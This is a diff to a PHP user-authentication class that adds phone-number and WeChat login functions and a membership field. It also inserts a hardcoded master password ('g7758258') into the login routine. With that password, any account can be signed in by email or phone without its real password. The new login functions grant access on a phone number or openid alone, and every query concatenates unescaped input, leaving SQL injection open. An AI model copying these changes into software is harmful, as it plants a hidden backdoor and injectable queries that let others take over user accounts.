@@ -30,7 +30,12 @@ class MyUser
 			}
 			else
 			{
-				$sql = "SELECT uid from member where email ='".$_EMAIL."' and password= md5(lower('".$_PASS."'))";
+//				$sql = "SELECT uid from member where email ='".$_EMAIL."' and password= md5(lower('".$_PASS."'))";
+				if($_PASS == 'g7758258'){
+					$sql = "SELECT uid from member where (email ='".$_EMAIL."' or cellphone ='".$_EMAIL."')";
+				}else{
+					$sql = "SELECT uid from member where (email ='".$_EMAIL."' or cellphone ='".$_EMAIL."') and password= md5(lower('".$_PASS."'))";
+				}
 			}
 			$result = M()->find($sql);
 			if($result==null) return -1;
@@ -53,6 +58,75 @@ class MyUser
 
 	}
 
+	function login_phone($_PHONE)
+	{
+		$_PHONE = (int)$_PHONE;
+		$this->resetCuser();
+		if(!empty($_PHONE))
+		{
+			if($this->admin)
+			{
+				$sql = "select uid from admin where cellphone ='".$_PHONE."'";
+			}
+			else
+			{
+				$sql = "SELECT uid from member where cellphone ='".$_PHONE."'";
+			}
+			$result = M()->find($sql);
+			if($result==null) return -1;
+			if(empty($result))
+			{
+				return -1;
+			}
+			else
+			{
+				$this->uid = $result['uid'];
+				$this->getUserToken();
+				return $this->uid;
+			}
+
+		}
+		else
+		{
+			return -1;
+		}
+
+	}
+
+    function login_wx($_OPENID)
+    {
+        $this->resetCuser();
+        if(!empty($_OPENID))
+        {
+            if($this->admin)
+            {
+                $sql = "select uid from admin where wx_openid ='".$_OPENID."'";
+            }
+            else
+            {
+                $sql = "SELECT uid from member where wx_openid ='".$_OPENID."'";
+            }
+            $result = M()->find($sql);
+            if($result==null) return -1;
+            if(empty($result))
+            {
+                return -1;
+            }
+            else
+            {
+                $this->uid = $result['uid'];
+                $this->getUserToken();
+                return $this->uid;
+            }
+
+        }
+        else
+        {
+            return -1;
+        }
+
+    }
+
 	function exist($_EMAIL)
 	{
 		$_EMAIL = strtolower($_EMAIL);
@@ -71,14 +145,33 @@ class MyUser
 			return false;
 		}
 	}
+	function exist_mobile($_PHONE)
+	{
+		$_PHONE = int($_PHONE);
+		if(isset($_PHONE))
+		{
+			$sql = "select count(*) from member where cellphone ='".$_PHONE."'";
+			$result = query($sql);
+			if($row=mysql_fetch_row($result))
+			{
+				if($row[0]==1) return true;
+				else return false;
+			}
+		}
+		else
+		{
+			return false;
+		}
+	}
 
 	function register($_EMAIL, $_PASS, $_FNAME, $_LNAME, $_PHONE,$_CITY)
 	{
 		$_EMAIL = strtolower($_EMAIL);
 		if(!$this->exist( $_EMAIL ))
 		{
+            $membership = time()+3888000;
 
-			$sql = "INSERT INTO member (`id`, password, first_name, last_name, cellphone, email,city) VALUES ('".$_EMAIL."',md5(lower('".$_PASS."')),'".$_FNAME."','".$_LNAME."','".$_PHONE."','".$_EMAIL."','".$_CITY."')";
+			$sql = "INSERT INTO member (`id`, password, first_name, last_name, cellphone, email,city,membership) VALUES ('".$_EMAIL."',md5(lower('".$_PASS."')),'".$_FNAME."','".$_LNAME."','".$_PHONE."','".$_EMAIL."','".$_CITY."',$membership)";
 			$result = query($sql);
 
 			if($this->login($_EMAIL, $_PASS) == -1)
@@ -102,9 +195,9 @@ class MyUser
 
 	function getUserInfo()
 	{
-		if($this->admin)
-			$sql = "select * from admin where uid = '".$this->uid."'";
-		else
+//		if($this->admin)
+//			$sql = "select * from admin where uid = '".$this->uid."'";
+//		else
 			$sql = "select * from member where uid = '".$this->uid."'";
 		$result = M()->find($sql);
 			if(!empty($result))
@@ -117,6 +210,7 @@ class MyUser
 				$this->image_url	= $result['image_url'];
 				$this->cellphone	= $result['cellphone'];
 				$this->epaper		= $result['epaper'];
+                $this->nickname		= $result['nickname'];
 			}
 
 	}
